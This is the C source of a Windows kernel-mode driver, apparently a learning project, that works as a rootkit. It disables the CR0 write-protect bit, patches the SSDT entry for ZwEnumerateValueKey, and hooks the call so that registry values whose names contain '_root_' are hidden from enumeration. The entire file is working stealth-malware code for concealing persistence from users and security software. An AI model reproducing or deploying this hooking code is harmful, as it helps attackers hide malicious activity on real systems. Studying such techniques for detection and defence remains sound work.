/*++

Module Name:

    driver.c

Abstract:

    This file contains the driver entry points and callbacks.

Environment:

    Kernel-mode Driver Framework

--*/

#include "driver.h"

// import SST from x86 ntoskrnl.lib
__declspec(dllimport) SST KeServiceDescriptorTable;

ZwEnumerateValueKeyOriginal oldZwEnumerateValueKey = NULL;

//pointer in the SSDT to the routine we are hooking
PLONG target = NULL;

void DisableWP() {
    __asm {
        push edx;
        mov edx, cr0;
        and edx, 0xFFFEFFFF;
        mov cr0, edx;
        pop edx;
    }
}

/*
 * Enable the WP bit in CR0 register.
 */

void EnableWP() {
    __asm {
        push edx;
        mov edx, cr0;
        or edx, 0x00010000;
        mov cr0, edx;
        pop edx;
    }
}

NTSTATUS NewZwEnumerateValueKey(IN HANDLE KeyHandle, IN ULONG Index, IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID KeyValueInformation OPTIONAL, IN  ULONG Length, OUT PULONG ResultLength)
{
    NTSTATUS ntStatus;
    PWSTR ValueName;

    // Call the original API (NtEnumerateValueKey)
    ntStatus = oldZwEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);

    // Get value name
    if (KeyValueInformationClass == KeyValueFullInformation)
    {
        ValueName = ((PKEY_VALUE_FULL_INFORMATION)KeyValueInformation)->Name;

        // If the registry value name contains _root_ we increment the index and call the API a second time, hiding the first call results.
        if (ValueName != NULL && wcsstr(ValueName, L"_root_") != NULL)
        {
            DbgPrint("%d [%d] -- %ws\n", Index, KeyValueInformationClass, ValueName);

            // Skip index
            Index++;
            ValueName = L"";
            return oldZwEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
        }
    }
    return ntStatus;
}

PVOID HookSSDT(PVOID syscall, PVOID hookaddr) {
    UINT32 index;
    PLONG Pssdt;

    DbgPrint("Changing WP flag in CR0 to 0");
    DisableWP();
    DbgPrint("The WP flag in CR0 has been disabled.\r\n");

    /* identify the address of SSDT table */
    Pssdt = KeServiceDescriptorTable.ServiceTable;
    DbgPrint("The system call address is %x.\r\n", syscall);
    DbgPrint("The hook function address is %x.\r\n", hookaddr);
    DbgPrint("The address of the SSDT is: %x.\r\n", Pssdt);

    /* identify 'syscall' index into the SSDT table */
    index = *((PULONG)((PUCHAR)syscall + 0x1));
    DbgPrint("The index into the SSDT table is: %d.\r\n", index);

    /* get the address of the service routine in SSDT */
    target = &(Pssdt[index]);
    DbgPrint("The address of the SSDT routine to be hooked is: %x.\r\n", target);

    /* hook the service routine in SSDT */
    LONG interlockedReturn = InterlockedExchange(target, hookaddr);

    DbgPrint("%l",interlockedReturn);
    DbgPrint("%p", interlockedReturn);
    return (PVOID)interlockedReturn;
}



NTSTATUS InitDevice(
    _In_    WDFDRIVER       Driver,
    _Inout_ PWDFDEVICE_INIT DeviceInit
)
{
    UNREFERENCED_PARAMETER(Driver);

    NTSTATUS status;

    // Allocate the device object
    WDFDEVICE hDevice;

    DbgPrint("device has been invoked\n");

    // Create the device object
    status = WdfDeviceCreate(&DeviceInit,
        WDF_NO_OBJECT_ATTRIBUTES,
        &hDevice
    );
    DbgPrint("WdfDeviceCreate has returned\n");

    oldZwEnumerateValueKey = HookSSDT(&ZwEnumerateValueKey, &NewZwEnumerateValueKey);
    DbgPrint("hookSSDT has returned\n");
    EnableWP();

    DbgPrint("Init Device has returned\n");
    return status;
}

VOID Driver_EvtDriverUnload(_In_ WDFDRIVER Driver)
{
    UNREFERENCED_PARAMETER(Driver);
    DbgPrint("before unhooking");
    DbgPrint("The SSDT routine: %x.\r\n", target);
    DbgPrint("address of OLDzwEnumValueKey: %p. \r\n", oldZwEnumerateValueKey);
    DbgPrint("address of NEWzwEnumValueKey: %p. \r\n", (PULONG)NewZwEnumerateValueKey);
    DbgPrint("address of NEWzwEnumValueKey: %p. \r\n", &NewZwEnumerateValueKey);
    //remove the hook
    InterlockedExchange(target, (PULONG)oldZwEnumerateValueKey);
    DbgPrint("after unhooking");
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT driverObject, _In_ PUNICODE_STRING registryPath) {
    NTSTATUS status = STATUS_SUCCESS;

    WDF_DRIVER_CONFIG config;

    DbgPrint("DriverEntry\n");

    // Initialize the driver configuration object to register the
    // entry point for the EvtDeviceAdd callback, executes when PnP manager finds a device
    WDF_DRIVER_CONFIG_INIT(&config, InitDevice);

    config.EvtDriverUnload = Driver_EvtDriverUnload;

    status = WdfDriverCreate(driverObject, registryPath, WDF_NO_OBJECT_ATTRIBUTES, &config, WDF_NO_HANDLE);

    return status;
}


